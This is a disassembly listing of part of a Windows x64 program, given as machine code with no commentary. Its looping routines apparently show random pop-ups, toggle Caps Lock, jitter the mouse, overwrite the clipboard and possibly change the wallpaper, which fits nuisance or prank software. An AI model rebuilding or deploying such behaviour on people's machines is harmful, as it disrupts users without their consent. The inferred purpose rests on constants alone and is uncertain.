   1400016c0:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   1400016c5:	48 3b c7             	cmp    %rdi,%rax
   1400016c8:	7d 0d                	jge    0x1400016d7
   1400016ca:	48 05 00 ca 9a 3b    	add    $0x3b9aca00,%rax
   1400016d0:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400016d5:	eb 05                	jmp    0x1400016dc
   1400016d7:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400016dc:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400016e1:	e8 1a 46 00 00       	call   0x140005d00
   1400016e6:	80 3d c7 b9 00 00 00 	cmpb   $0x0,0xb9c7(%rip)        # 0x14000d0b4
   1400016ed:	75 c7                	jne    0x1400016b6
   1400016ef:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   1400016f4:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400016f9:	33 c9                	xor    %ecx,%ecx
   1400016fb:	48 83 c4 28          	add    $0x28,%rsp
   1400016ff:	48 ff 25 c2 6b 00 00 	rex.W jmp *0x6bc2(%rip)        # 0x1400082c8
   140001706:	cc                   	int3
   140001707:	cc                   	int3
   140001708:	cc                   	int3
   140001709:	cc                   	int3
   14000170a:	cc                   	int3
   14000170b:	cc                   	int3
   14000170c:	cc                   	int3
   14000170d:	cc                   	int3
   14000170e:	cc                   	int3
   14000170f:	cc                   	int3
   140001710:	4c 8b dc             	mov    %rsp,%r11
   140001713:	48 83 ec 68          	sub    $0x68,%rsp
   140001717:	80 3d 96 b9 00 00 00 	cmpb   $0x0,0xb996(%rip)        # 0x14000d0b4
   14000171e:	48 8d 05 93 70 00 00 	lea    0x7093(%rip),%rax        # 0x1400087b8
   140001725:	49 89 43 c8          	mov    %rax,-0x38(%r11)
   140001729:	48 8d 05 a0 70 00 00 	lea    0x70a0(%rip),%rax        # 0x1400087d0
   140001730:	49 89 43 d0          	mov    %rax,-0x30(%r11)
   140001734:	48 8d 05 ad 70 00 00 	lea    0x70ad(%rip),%rax        # 0x1400087e8
   14000173b:	49 89 43 d8          	mov    %rax,-0x28(%r11)
   14000173f:	0f 84 be 00 00 00    	je     0x140001803
   140001745:	49 89 5b 18          	mov    %rbx,0x18(%r11)
   140001749:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140001750:	ff ff 7f 
   140001753:	49 89 6b f8          	mov    %rbp,-0x8(%r11)
   140001757:	48 bd ff a1 2f 4d ff 	movabs $0x7fffffff4d2fa1ff,%rbp
   14000175e:	ff ff 7f 
   140001761:	49 89 73 f0          	mov    %rsi,-0x10(%r11)
   140001765:	33 f6                	xor    %esi,%esi
   140001767:	49 89 7b e8          	mov    %rdi,-0x18(%r11)
   14000176b:	bf 00 5e d0 b2       	mov    $0xb2d05e00,%edi
   140001770:	ff 15 4a 6e 00 00    	call   *0x6e4a(%rip)        # 0x1400085c0
   140001776:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   14000177d:	00 
   14000177e:	45 33 c9             	xor    %r9d,%r9d
   140001781:	44 8b c0             	mov    %eax,%r8d
   140001784:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001789:	b8 56 55 55 55       	mov    $0x55555556,%eax
   14000178e:	41 f7 e8             	imul   %r8d
   140001791:	8b ca                	mov    %edx,%ecx
   140001793:	c1 e9 1f             	shr    $0x1f,%ecx
   140001796:	03 d1                	add    %ecx,%edx
   140001798:	8d 0c 52             	lea    (%rdx,%rdx,2),%ecx
   14000179b:	44 2b c1             	sub    %ecx,%r8d
   14000179e:	48 8d 15 5b 70 00 00 	lea    0x705b(%rip),%rdx        # 0x140008800
   1400017a5:	4d 63 c0             	movslq %r8d,%r8
   1400017a8:	33 c9                	xor    %ecx,%ecx
   1400017aa:	4e 8b 44 c4 30       	mov    0x30(%rsp,%r8,8),%r8
   1400017af:	ff 15 db 6a 00 00    	call   *0x6adb(%rip)        # 0x140008290
   1400017b5:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   1400017ba:	e8 61 f8 ff ff       	call   0x140001020
   1400017bf:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   1400017c4:	48 3b c5             	cmp    %rbp,%rax
   1400017c7:	7d 0b                	jge    0x1400017d4
   1400017c9:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   1400017cd:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   1400017d2:	eb 05                	jmp    0x1400017d9
   1400017d4:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   1400017d9:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400017de:	e8 1d 45 00 00       	call   0x140005d00
   1400017e3:	40 38 35 ca b8 00 00 	cmp    %sil,0xb8ca(%rip)        # 0x14000d0b4
   1400017ea:	75 84                	jne    0x140001770
   1400017ec:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   1400017f1:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400017f6:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   1400017fb:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140001802:	00 
   140001803:	48 83 c4 68          	add    $0x68,%rsp
   140001807:	c3                   	ret
   140001808:	cc                   	int3
   140001809:	cc                   	int3
   14000180a:	cc                   	int3
   14000180b:	cc                   	int3
   14000180c:	cc                   	int3
   14000180d:	cc                   	int3
   14000180e:	cc                   	int3
   14000180f:	cc                   	int3
   140001810:	48 83 ec 38          	sub    $0x38,%rsp
   140001814:	45 33 c9             	xor    %r9d,%r9d
   140001817:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000181e:	00 00 
   140001820:	4c 8d 05 e1 70 00 00 	lea    0x70e1(%rip),%r8        # 0x140008908
   140001827:	33 c9                	xor    %ecx,%ecx
   140001829:	48 8d 15 e0 6f 00 00 	lea    0x6fe0(%rip),%rdx        # 0x140008810
   140001830:	ff 15 c2 6d 00 00    	call   *0x6dc2(%rip)        # 0x1400085f8
   140001836:	80 3d 77 b8 00 00 00 	cmpb   $0x0,0xb877(%rip)        # 0x14000d0b4
   14000183d:	0f 84 8d 00 00 00    	je     0x1400018d0
   140001843:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140001848:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   14000184f:	ff ff 7f 
   140001852:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   140001857:	48 be ff 1b f4 ab fd 	movabs $0x7ffffffdabf41bff,%rsi
   14000185e:	ff ff 7f 
   140001861:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140001866:	48 bf 00 e4 0b 54 02 	movabs $0x2540be400,%rdi
   14000186d:	00 00 00 
   140001870:	41 b9 03 00 00 00    	mov    $0x3,%r9d
   140001876:	4c 8d 05 8b 70 00 00 	lea    0x708b(%rip),%r8        # 0x140008908
   14000187d:	33 d2                	xor    %edx,%edx
   14000187f:	b9 14 00 00 00       	mov    $0x14,%ecx
   140001884:	ff 15 46 6a 00 00    	call   *0x6a46(%rip)        # 0x1400082d0
   14000188a:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000188f:	e8 8c f7 ff ff       	call   0x140001020
   140001894:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140001899:	48 3b c6             	cmp    %rsi,%rax
   14000189c:	7d 0b                	jge    0x1400018a9
   14000189e:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   1400018a2:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   1400018a7:	eb 05                	jmp    0x1400018ae
   1400018a9:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400018ae:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400018b3:	e8 48 44 00 00       	call   0x140005d00
   1400018b8:	80 3d f5 b7 00 00 00 	cmpb   $0x0,0xb7f5(%rip)        # 0x14000d0b4
   1400018bf:	75 af                	jne    0x140001870
   1400018c1:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   1400018c6:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400018cb:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400018d0:	48 83 c4 38          	add    $0x38,%rsp
   1400018d4:	c3                   	ret
   1400018d5:	cc                   	int3
   1400018d6:	cc                   	int3
   1400018d7:	cc                   	int3
   1400018d8:	cc                   	int3
   1400018d9:	cc                   	int3
   1400018da:	cc                   	int3
   1400018db:	cc                   	int3
   1400018dc:	cc                   	int3
   1400018dd:	cc                   	int3
   1400018de:	cc                   	int3
   1400018df:	cc                   	int3
   1400018e0:	48 83 ec 68          	sub    $0x68,%rsp
   1400018e4:	48 8b 05 55 b7 00 00 	mov    0xb755(%rip),%rax        # 0x14000d040
   1400018eb:	48 33 c4             	xor    %rsp,%rax
   1400018ee:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400018f3:	33 d2                	xor    %edx,%edx
   1400018f5:	48 8d 0d 24 70 00 00 	lea    0x7024(%rip),%rcx        # 0x140008920
   1400018fc:	ff 15 66 6a 00 00    	call   *0x6a66(%rip)        # 0x140008368
   140001902:	80 3d ab b7 00 00 00 	cmpb   $0x0,0xb7ab(%rip)        # 0x14000d0b4
   140001909:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000190e:	c7 44 24 30 20 00 00 	movl   $0x20,0x30(%rsp)
   140001915:	00 
   140001916:	c7 44 24 40 0f 00 00 	movl   $0xf,0x40(%rsp)
   14000191d:	00 
   14000191e:	c7 44 24 44 ff ff ff 	movl   $0xffffffff,0x44(%rsp)
   140001925:	ff 
   140001926:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%rsp)
   14000192d:	00 
   14000192e:	74 6e                	je     0x14000199e
   140001930:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   140001935:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   14000193c:	ff ff 7f 
   14000193f:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   140001944:	48 bf ff 6b ca 88 ff 	movabs $0x7fffffff88ca6bff,%rdi
   14000194b:	ff ff 7f 
   14000194e:	66 90                	xchg   %ax,%ax
   140001950:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001955:	ff 15 fd 69 00 00    	call   *0x69fd(%rip)        # 0x140008358
   14000195b:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140001960:	e8 bb f6 ff ff       	call   0x140001020
   140001965:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   14000196a:	48 3b c7             	cmp    %rdi,%rax
   14000196d:	7d 0d                	jge    0x14000197c
   14000196f:	48 05 00 94 35 77    	add    $0x77359400,%rax
   140001975:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000197a:	eb 05                	jmp    0x140001981
   14000197c:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001981:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001986:	e8 75 43 00 00       	call   0x140005d00
   14000198b:	80 3d 22 b7 00 00 00 	cmpb   $0x0,0xb722(%rip)        # 0x14000d0b4
   140001992:	75 bc                	jne    0x140001950
   140001994:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   140001999:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   14000199e:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1400019a3:	48 33 cc             	xor    %rsp,%rcx
   1400019a6:	e8 95 4e 00 00       	call   0x140006840
   1400019ab:	48 83 c4 68          	add    $0x68,%rsp
   1400019af:	c3                   	ret
   1400019b0:	48 83 ec 28          	sub    $0x28,%rsp
   1400019b4:	80 3d f9 b6 00 00 00 	cmpb   $0x0,0xb6f9(%rip)        # 0x14000d0b4
   1400019bb:	0f 84 88 00 00 00    	je     0x140001a49
   1400019c1:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400019c6:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   1400019cd:	ff ff 7f 
   1400019d0:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400019d5:	48 bf ff 35 65 c4 ff 	movabs $0x7fffffffc46535ff,%rdi
   1400019dc:	ff ff 7f 
   1400019df:	90                   	nop
   1400019e0:	45 33 c9             	xor    %r9d,%r9d
   1400019e3:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400019e9:	b2 3a                	mov    $0x3a,%dl
   1400019eb:	b1 14                	mov    $0x14,%cl
   1400019ed:	ff 15 25 69 00 00    	call   *0x6925(%rip)        # 0x140008318
   1400019f3:	45 33 c9             	xor    %r9d,%r9d
   1400019f6:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   1400019fc:	b2 3a                	mov    $0x3a,%dl
   1400019fe:	b1 14                	mov    $0x14,%cl
   140001a00:	ff 15 12 69 00 00    	call   *0x6912(%rip)        # 0x140008318
   140001a06:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140001a0b:	e8 10 f6 ff ff       	call   0x140001020
   140001a10:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140001a15:	48 3b c7             	cmp    %rdi,%rax
   140001a18:	7d 0d                	jge    0x140001a27
   140001a1a:	48 05 00 ca 9a 3b    	add    $0x3b9aca00,%rax
   140001a20:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001a25:	eb 05                	jmp    0x140001a2c
   140001a27:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001a2c:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001a31:	e8 ca 42 00 00       	call   0x140005d00
   140001a36:	80 3d 77 b6 00 00 00 	cmpb   $0x0,0xb677(%rip)        # 0x14000d0b4
   140001a3d:	75 a1                	jne    0x1400019e0
   140001a3f:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140001a44:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001a49:	48 83 c4 28          	add    $0x28,%rsp
   140001a4d:	c3                   	ret
   140001a4e:	cc                   	int3
   140001a4f:	cc                   	int3
   140001a50:	4c 8b dc             	mov    %rsp,%r11
   140001a53:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   140001a5a:	48 8b 05 df b5 00 00 	mov    0xb5df(%rip),%rax        # 0x14000d040
   140001a61:	48 33 c4             	xor    %rsp,%rax
   140001a64:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140001a69:	80 3d 44 b6 00 00 00 	cmpb   $0x0,0xb644(%rip)        # 0x14000d0b4
   140001a70:	0f 84 b7 01 00 00    	je     0x140001c2d
   140001a76:	49 89 5b 08          	mov    %rbx,0x8(%r11)
   140001a7a:	49 89 6b 10          	mov    %rbp,0x10(%r11)
   140001a7e:	48 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbp
   140001a85:	ff ff 7f 
   140001a88:	49 89 73 18          	mov    %rsi,0x18(%r11)
   140001a8c:	49 89 7b 20          	mov    %rdi,0x20(%r11)
   140001a90:	4d 89 63 f8          	mov    %r12,-0x8(%r11)
   140001a94:	49 bc 7f 3c 36 fe ff 	movabs $0x7ffffffffe363c7f,%r12
   140001a9b:	ff ff 7f 
   140001a9e:	4d 89 73 f0          	mov    %r14,-0x10(%r11)
   140001aa2:	45 33 f6             	xor    %r14d,%r14d
   140001aa5:	4d 89 7b e8          	mov    %r15,-0x18(%r11)
   140001aa9:	49 bf ff d2 ce fe ff 	movabs $0x7ffffffffeced2ff,%r15
   140001ab0:	ff ff 7f 
   140001ab3:	ff 15 bf 68 00 00    	call   *0x68bf(%rip)        # 0x140008378
   140001ab9:	48 8b f0             	mov    %rax,%rsi
   140001abc:	48 85 c0             	test   %rax,%rax
   140001abf:	0f 84 f9 00 00 00    	je     0x140001bbe
   140001ac5:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   140001aca:	48 8b c8             	mov    %rax,%rcx
   140001acd:	ff 15 15 68 00 00    	call   *0x6815(%rip)        # 0x1400082e8
   140001ad3:	85 c0                	test   %eax,%eax
   140001ad5:	0f 84 e3 00 00 00    	je     0x140001bbe
   140001adb:	bb 0a 00 00 00       	mov    $0xa,%ebx
   140001ae0:	ff 15 da 6a 00 00    	call   *0x6ada(%rip)        # 0x1400085c0
   140001ae6:	44 8b c0             	mov    %eax,%r8d
   140001ae9:	b8 67 66 66 66       	mov    $0x66666667,%eax
   140001aee:	41 f7 e8             	imul   %r8d
   140001af1:	c1 fa 03             	sar    $0x3,%edx
   140001af4:	8b ca                	mov    %edx,%ecx
   140001af6:	c1 e9 1f             	shr    $0x1f,%ecx
   140001af9:	03 d1                	add    %ecx,%edx
   140001afb:	8d 0c 92             	lea    (%rdx,%rdx,4),%ecx
   140001afe:	c1 e1 02             	shl    $0x2,%ecx
   140001b01:	44 2b c1             	sub    %ecx,%r8d
   140001b04:	41 8d 78 f6          	lea    -0xa(%r8),%edi
   140001b08:	ff 15 b2 6a 00 00    	call   *0x6ab2(%rip)        # 0x1400085c0
   140001b0e:	44 8b 4c 24 5c       	mov    0x5c(%rsp),%r9d
   140001b13:	44 8b c0             	mov    %eax,%r8d
   140001b16:	b8 67 66 66 66       	mov    $0x66666667,%eax
   140001b1b:	c7 44 24 30 15 00 00 	movl   $0x15,0x30(%rsp)
   140001b22:	00 
   140001b23:	41 f7 e8             	imul   %r8d
   140001b26:	41 83 c1 f6          	add    $0xfffffff6,%r9d
   140001b2a:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140001b2f:	c1 fa 03             	sar    $0x3,%edx
   140001b32:	8b ca                	mov    %edx,%ecx
   140001b34:	44 89 74 24 20       	mov    %r14d,0x20(%rsp)
   140001b39:	c1 e9 1f             	shr    $0x1f,%ecx
   140001b3c:	03 d1                	add    %ecx,%edx
   140001b3e:	8d 0c 92             	lea    (%rdx,%rdx,4),%ecx
   140001b41:	33 d2                	xor    %edx,%edx
   140001b43:	c1 e1 02             	shl    $0x2,%ecx
   140001b46:	44 2b c1             	sub    %ecx,%r8d
   140001b49:	48 8b ce             	mov    %rsi,%rcx
   140001b4c:	45 03 c8             	add    %r8d,%r9d
   140001b4f:	44 8b 44 24 58       	mov    0x58(%rsp),%r8d
   140001b54:	44 03 c7             	add    %edi,%r8d
   140001b57:	ff 15 b3 67 00 00    	call   *0x67b3(%rip)        # 0x140008310
   140001b5d:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140001b62:	e8 b9 f4 ff ff       	call   0x140001020
   140001b67:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140001b6c:	49 3b c4             	cmp    %r12,%rax
   140001b6f:	7d 0d                	jge    0x140001b7e
   140001b71:	48 05 80 c3 c9 01    	add    $0x1c9c380,%rax
   140001b77:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001b7c:	eb 05                	jmp    0x140001b83
   140001b7e:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   140001b83:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001b88:	e8 73 41 00 00       	call   0x140005d00
   140001b8d:	48 83 eb 01          	sub    $0x1,%rbx
   140001b91:	0f 85 49 ff ff ff    	jne    0x140001ae0
   140001b97:	44 8b 4c 24 5c       	mov    0x5c(%rsp),%r9d
   140001b9c:	33 d2                	xor    %edx,%edx
   140001b9e:	44 8b 44 24 58       	mov    0x58(%rsp),%r8d
   140001ba3:	48 8b ce             	mov    %rsi,%rcx
   140001ba6:	c7 44 24 30 15 00 00 	movl   $0x15,0x30(%rsp)
   140001bad:	00 
   140001bae:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140001bb3:	44 89 74 24 20       	mov    %r14d,0x20(%rsp)
   140001bb8:	ff 15 52 67 00 00    	call   *0x6752(%rip)        # 0x140008310
   140001bbe:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001bc3:	e8 58 f4 ff ff       	call   0x140001020
   140001bc8:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140001bcd:	49 3b c7             	cmp    %r15,%rax
   140001bd0:	7d 0d                	jge    0x140001bdf
   140001bd2:	48 05 00 2d 31 01    	add    $0x1312d00,%rax
   140001bd8:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001bdd:	eb 05                	jmp    0x140001be4
   140001bdf:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   140001be4:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001be9:	e8 12 41 00 00       	call   0x140005d00
   140001bee:	44 38 35 bf b4 00 00 	cmp    %r14b,0xb4bf(%rip)        # 0x14000d0b4
   140001bf5:	0f 85 b8 fe ff ff    	jne    0x140001ab3
   140001bfb:	4c 8b 7c 24 70       	mov    0x70(%rsp),%r15
   140001c00:	4c 8b 74 24 78       	mov    0x78(%rsp),%r14
   140001c05:	4c 8b a4 24 80 00 00 	mov    0x80(%rsp),%r12
   140001c0c:	00 
   140001c0d:	48 8b bc 24 a8 00 00 	mov    0xa8(%rsp),%rdi
   140001c14:	00 
   140001c15:	48 8b b4 24 a0 00 00 	mov    0xa0(%rsp),%rsi
   140001c1c:	00 
   140001c1d:	48 8b ac 24 98 00 00 	mov    0x98(%rsp),%rbp
   140001c24:	00 
   140001c25:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   140001c2c:	00 
   140001c2d:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140001c32:	48 33 cc             	xor    %rsp,%rcx
   140001c35:	e8 06 4c 00 00       	call   0x140006840
   140001c3a:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   140001c41:	c3                   	ret
   140001c42:	cc                   	int3
   140001c43:	cc                   	int3
   140001c44:	cc                   	int3
   140001c45:	cc                   	int3
   140001c46:	cc                   	int3
   140001c47:	cc                   	int3
   140001c48:	cc                   	int3
   140001c49:	cc                   	int3
   140001c4a:	cc                   	int3
   140001c4b:	cc                   	int3
   140001c4c:	cc                   	int3
   140001c4d:	cc                   	int3
   140001c4e:	cc                   	int3
   140001c4f:	cc                   	int3
   140001c50:	4c 8b dc             	mov    %rsp,%r11
   140001c53:	48 83 ec 68          	sub    $0x68,%rsp
   140001c57:	80 3d 56 b4 00 00 00 	cmpb   $0x0,0xb456(%rip)        # 0x14000d0b4
   140001c5e:	48 8d 05 db 6c 00 00 	lea    0x6cdb(%rip),%rax        # 0x140008940
   140001c65:	49 89 43 c8          	mov    %rax,-0x38(%r11)
   140001c69:	48 8d 05 00 6d 00 00 	lea    0x6d00(%rip),%rax        # 0x140008970
   140001c70:	49 89 43 d0          	mov    %rax,-0x30(%r11)
   140001c74:	48 8d 05 25 6d 00 00 	lea    0x6d25(%rip),%rax        # 0x1400089a0
   140001c7b:	49 89 43 d8          	mov    %rax,-0x28(%r11)
   140001c7f:	48 8d 05 6a 6d 00 00 	lea    0x6d6a(%rip),%rax        # 0x1400089f0
   140001c86:	49 89 43 e0          	mov    %rax,-0x20(%r11)
   140001c8a:	0f 84 b9 00 00 00    	je     0x140001d49
   140001c90:	49 89 5b 18          	mov    %rbx,0x18(%r11)
   140001c94:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140001c9b:	ff ff 7f 
   140001c9e:	49 89 6b f8          	mov    %rbp,-0x8(%r11)
   140001ca2:	48 bd ff 0d fa d5 fe 	movabs $0x7ffffffed5fa0dff,%rbp
   140001ca9:	ff ff 7f 
   140001cac:	49 89 73 f0          	mov    %rsi,-0x10(%r11)
   140001cb0:	33 f6                	xor    %esi,%esi
   140001cb2:	49 89 7b e8          	mov    %rdi,-0x18(%r11)
   140001cb6:	48 bf 00 f2 05 2a 01 	movabs $0x12a05f200,%rdi
   140001cbd:	00 00 00 
   140001cc0:	ff 15 fa 68 00 00    	call   *0x68fa(%rip)        # 0x1400085c0
   140001cc6:	25 03 00 00 80       	and    $0x80000003,%eax
   140001ccb:	7d 07                	jge    0x140001cd4
   140001ccd:	ff c8                	dec    %eax
   140001ccf:	83 c8 fc             	or     $0xfffffffc,%eax
   140001cd2:	ff c0                	inc    %eax
   140001cd4:	4c 63 c0             	movslq %eax,%r8
   140001cd7:	48 8d 15 22 6b 00 00 	lea    0x6b22(%rip),%rdx        # 0x140008800
   140001cde:	c7 44 24 28 0a 00 00 	movl   $0xa,0x28(%rsp)
   140001ce5:	00 
   140001ce6:	45 33 c9             	xor    %r9d,%r9d
   140001ce9:	33 c9                	xor    %ecx,%ecx
   140001ceb:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001cf0:	4e 8b 44 c4 30       	mov    0x30(%rsp,%r8,8),%r8
   140001cf5:	ff 15 95 65 00 00    	call   *0x6595(%rip)        # 0x140008290
   140001cfb:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   140001d00:	e8 1b f3 ff ff       	call   0x140001020
   140001d05:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   140001d0a:	48 3b c5             	cmp    %rbp,%rax
   140001d0d:	7d 0b                	jge    0x140001d1a
   140001d0f:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   140001d13:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   140001d18:	eb 05                	jmp    0x140001d1f
   140001d1a:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   140001d1f:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140001d24:	e8 d7 3f 00 00       	call   0x140005d00
   140001d29:	40 38 35 84 b3 00 00 	cmp    %sil,0xb384(%rip)        # 0x14000d0b4
   140001d30:	75 8e                	jne    0x140001cc0
   140001d32:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140001d37:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140001d3c:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140001d41:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140001d48:	00 
   140001d49:	48 83 c4 68          	add    $0x68,%rsp
   140001d4d:	c3                   	ret
   140001d4e:	cc                   	int3
   140001d4f:	cc                   	int3
   140001d50:	48 83 ec 28          	sub    $0x28,%rsp
   140001d54:	80 3d 59 b3 00 00 00 	cmpb   $0x0,0xb359(%rip)        # 0x14000d0b4
   140001d5b:	0f 84 d4 00 00 00    	je     0x140001e35
   140001d61:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   140001d66:	48 be ff 35 65 c4 ff 	movabs $0x7fffffffc46535ff,%rsi
   140001d6d:	ff ff 7f 
   140001d70:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001d75:	48 bf ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rdi
   140001d7c:	ff ff 7f 
   140001d7f:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140001d84:	33 c9                	xor    %ecx,%ecx
   140001d86:	ff 15 ac 65 00 00    	call   *0x65ac(%rip)        # 0x140008338
   140001d8c:	85 c0                	test   %eax,%eax
   140001d8e:	74 59                	je     0x140001de9
   140001d90:	ff 15 fa 65 00 00    	call   *0x65fa(%rip)        # 0x140008390
   140001d96:	ba 12 00 00 00       	mov    $0x12,%edx
   140001d9b:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001da0:	ff 15 52 63 00 00    	call   *0x6352(%rip)        # 0x1400080f8
   140001da6:	48 8b d8             	mov    %rax,%rbx
   140001da9:	48 85 c0             	test   %rax,%rax
   140001dac:	74 35                	je     0x140001de3
   140001dae:	48 8b c8             	mov    %rax,%rcx
   140001db1:	ff 15 f1 62 00 00    	call   *0x62f1(%rip)        # 0x1400080a8
   140001db7:	0f 10 05 8a 6c 00 00 	movups 0x6c8a(%rip),%xmm0        # 0x140008a48
   140001dbe:	0f 11 00             	movups %xmm0,(%rax)
   140001dc1:	0f b7 0d 90 6c 00 00 	movzwl 0x6c90(%rip),%ecx        # 0x140008a58
   140001dc8:	66 89 48 10          	mov    %cx,0x10(%rax)
   140001dcc:	48 8b cb             	mov    %rbx,%rcx
   140001dcf:	ff 15 7b 62 00 00    	call   *0x627b(%rip)        # 0x140008050
   140001dd5:	48 8b d3             	mov    %rbx,%rdx
   140001dd8:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140001ddd:	ff 15 7d 65 00 00    	call   *0x657d(%rip)        # 0x140008360
   140001de3:	ff 15 5f 65 00 00    	call   *0x655f(%rip)        # 0x140008348
   140001de9:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140001dee:	e8 2d f2 ff ff       	call   0x140001020
   140001df3:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140001df8:	48 3b c6             	cmp    %rsi,%rax
   140001dfb:	7d 0d                	jge    0x140001e0a
   140001dfd:	48 05 00 ca 9a 3b    	add    $0x3b9aca00,%rax
   140001e03:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001e08:	eb 05                	jmp    0x140001e0f
   140001e0a:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140001e0f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001e14:	e8 e7 3e 00 00       	call   0x140005d00
   140001e19:	80 3d 94 b2 00 00 00 	cmpb   $0x0,0xb294(%rip)        # 0x14000d0b4
   140001e20:	0f 85 5e ff ff ff    	jne    0x140001d84
   140001e26:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140001e2b:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140001e30:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001e35:	48 83 c4 28          	add    $0x28,%rsp
   140001e39:	c3                   	ret
   140001e3a:	cc                   	int3
   140001e3b:	cc                   	int3
   140001e3c:	cc                   	int3
   140001e3d:	cc                   	int3
   140001e3e:	cc                   	int3
